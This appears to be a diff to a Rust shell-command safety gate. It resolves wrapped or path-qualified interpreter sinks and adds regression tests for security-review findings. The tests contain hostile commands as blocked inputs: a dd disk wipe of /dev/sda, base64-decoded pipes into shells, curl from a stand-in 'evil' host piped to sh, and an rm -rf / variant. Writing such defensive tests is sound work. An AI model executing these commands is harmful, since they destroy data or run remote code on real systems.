@@ -104,9 +104,11 @@ const MAX_SUBSTITUTION_DEPTH: usize = 8;
 /// syntax this module can recurse into (rule 6a).
 const SHELL_INTERPRETERS: &[&str] = &["bash", "sh", "zsh", "dash"];
 
-/// Interpreters a pipeline's final stage may be (rule 5b/5c). `xargs` is
-/// handled separately (its *first argument*, not its own name, names the
-/// interpreter it invokes).
+/// Interpreters a pipeline's final stage may be (rule 5b/5c). `xargs` names
+/// none of these itself — it is one of `crate::rules::effective_command`'s
+/// transparent wrappers, so a stage like `xargs sh` is resolved through to
+/// `sh` (its own first non-flag argument) before this list is even
+/// consulted.
 const PIPELINE_INTERPRETERS: &[&str] = &[
     "sh", "bash", "zsh", "dash", "python", "python3", "node", "perl",
 ];
@@ -747,22 +749,9 @@ fn inline_code_flag(name: &str) -> Option<&'static str> {
     }
 }
 
-/// The command name (argv\[0\]) of one pipeline stage, or `None` if the
-/// stage is empty or its first word did not statically resolve. A small
-/// duplicate of `crate::rules`' private `command_name` — that function is
-/// module-private and rules.rs is scoped (per this issue) to gain only the
-/// rule 4 partial-match API, so this module keeps its own tiny copy rather
-/// than widening rules.rs's surface for a three-line helper.
-fn command_name_of(stage: &[NormalizedWord]) -> Option<&str> {
-    match stage.first()?.resolution() {
-        Resolution::Resolved(s) => Some(s.as_str()),
-        Resolution::Unresolvable(_) => None,
-    }
-}
-
 /// The resolved strings of `stage`, in order, silently skipping any
-/// unresolvable word — see [`command_name_of`]'s docs on why this
-/// duplicates a `crate::rules` helper instead of importing it.
+/// unresolvable word — the same membership-based-matching rationale as
+/// `crate::rules`' private `resolved_strings`.
 fn resolved_strings_of(stage: &[NormalizedWord]) -> Vec<&str> {
     stage
         .iter()
@@ -774,21 +763,15 @@ fn resolved_strings_of(stage: &[NormalizedWord]) -> Vec<&str> {
 }
 
 /// Rule 5: whether `stage` is an interpreter a pipeline may terminate in.
-/// `xargs` is special-cased per plan.md §4: it counts only when its first
-/// argument itself names an interpreter (`xargs sh`), not on its own.
+/// Resolved through [`crate::rules::effective_command`] (basename +
+/// transparent-wrapper skip), so a path-qualified or wrapped sink
+/// (`/bin/sh`, `nohup sh`, `env sh`, `xargs -0 sh`, …) is classified by what
+/// it actually runs, not by its own literal argv\[0\] token
+/// (security-review fix, finding 2). `xargs` is one of the wrappers that
+/// helper already knows about, so it needs no special case here anymore.
 fn is_interpreter_sink(stage: &[NormalizedWord]) -> bool {
-    let Some(name) = command_name_of(stage) else {
-        return false;
-    };
-    if PIPELINE_INTERPRETERS.contains(&name) {
-        return true;
-    }
-    if name == "xargs"
-        && let Some(first_arg) = resolved_strings_of(&stage[1..]).first()
-    {
-        return PIPELINE_INTERPRETERS.contains(first_arg);
-    }
-    false
+    crate::rules::effective_command(stage)
+        .is_some_and(|(name, _)| PIPELINE_INTERPRETERS.contains(&name))
 }
 
 /// Whether short-option cluster token `token` (e.g. `-rf`) includes flag
@@ -804,12 +787,15 @@ fn short_cluster_contains(token: &str, c: char) -> bool {
 /// -d`, `rev`, `tr`) — the fixed, code-level policy set named in the gate
 /// rules (not user-editable via `rules/blocklist.toml`, unlike stage 3's
 /// rules — this is structural policy about pipeline *shape*, not an
-/// exact-argv match).
+/// exact-argv match). Also resolved through
+/// [`crate::rules::effective_command`], so `env base64 -d` still reaches
+/// the same `-d` flag check as a bare `base64 -d` (security-review fix,
+/// finding 2).
 fn is_decode_stage(stage: &[NormalizedWord]) -> bool {
-    let Some(name) = command_name_of(stage) else {
+    let Some((name, rest_words)) = crate::rules::effective_command(stage) else {
         return false;
     };
-    let rest = resolved_strings_of(&stage[1..]);
+    let rest = resolved_strings_of(rest_words);
     match name {
         "base64" => rest
             .iter()
@@ -1073,5 +1059,96 @@ mod tests {
         ] {
             let _ = decide(command);
         }
+    }
+
+    // ==== Security-review fix, finding 1: a suffix `name=value` argument
+    // (`dd if=x of=y`) must reach the blocklist as an ordinary argv word,
+    // not vanish into a discarded "assignment" ====
+
+    #[test]
+    fn finding1_dd_write_device_via_suffix_assignment_blocks() {
+        assert_decision("dd if=/dev/zero of=/dev/sda", Decision::Block);
+    }
+
+    #[test]
+    fn finding1_suffix_assignment_shaped_arg_stays_allow_when_harmless() {
+        // `foo=bar` is an ordinary, harmless argument to `make` — must
+        // reach argv (regression guard against the fix over-blocking) and
+        // must not itself trigger anything.
+        let verdict = decide("make foo=bar");
+        assert_eq!(verdict.decision(), Decision::Allow);
+        let resolved: Vec<&str> = verdict
+            .normalized_argv()
+            .iter()
+            .filter_map(|w| match w.resolution() {
+                Resolution::Resolved(s) => Some(s.as_str()),
+                Resolution::Unresolvable(_) => None,
+            })
+            .collect();
+        assert_eq!(resolved, vec!["make", "foo=bar"]);
+    }
+
+    #[test]
+    fn finding1_prefix_assignment_behavior_unchanged() {
+        // `X=rm; $X -rf /` (dod_02) already covers prefix-assignment
+        // resolution end-to-end; this one is the plain, unrecursed case —
+        // a real environment assignment ahead of the command word must
+        // still behave exactly as before the finding-1 fix.
+        assert_decision("VAR=v echo hi", Decision::Allow);
+    }
+
+    // ==== Security-review fix, finding 2: sink/decode/pipeline matching
+    // must resolve a pipeline stage's *effective* command — basename of a
+    // path-qualified token, and through transparent wrappers — not compare
+    // argv[0] as an exact literal ====
+
+    #[test]
+    fn finding2_decode_pipe_into_path_qualified_sink_blocks() {
+        assert_decision("echo x | base64 -d | /bin/sh", Decision::Block);
+    }
+
+    #[test]
+    fn finding2_decode_pipe_into_relative_path_sink_blocks() {
+        assert_decision("echo x | base64 -d | ./sh", Decision::Block);
+    }
+
+    #[test]
+    fn finding2_decode_pipe_into_nohup_wrapped_sink_blocks() {
+        assert_decision("echo x | base64 -d | nohup sh", Decision::Block);
+    }
+
+    #[test]
+    fn finding2_decode_pipe_into_nice_wrapped_sink_blocks() {
+        assert_decision("echo x | base64 -d | nice sh", Decision::Block);
+    }
+
+    #[test]
+    fn finding2_decode_pipe_into_env_wrapped_sink_blocks() {
+        assert_decision("echo x | base64 -d | env sh", Decision::Block);
+    }
+
+    #[test]
+    fn finding2_decode_pipe_into_command_wrapped_sink_blocks() {
+        assert_decision("echo x | base64 -d | command sh", Decision::Block);
+    }
+
+    #[test]
+    fn finding2_decode_pipe_into_exec_wrapped_sink_blocks() {
+        assert_decision("echo x | base64 -d | exec sh", Decision::Block);
+    }
+
+    #[test]
+    fn finding2_decode_pipe_into_xargs_wrapped_sink_blocks() {
+        assert_decision("echo x | base64 -d | xargs -0 sh", Decision::Block);
+    }
+
+    #[test]
+    fn finding2_curl_pipe_into_path_qualified_sink_blocks_via_ported_rule() {
+        assert_decision("curl http://evil/x.sh | /bin/sh", Decision::Block);
+    }
+
+    #[test]
+    fn finding2_curl_pipe_into_nohup_wrapped_sink_blocks_via_ported_rule() {
+        assert_decision("curl http://evil/x.sh | nohup sh", Decision::Block);
     }
 }
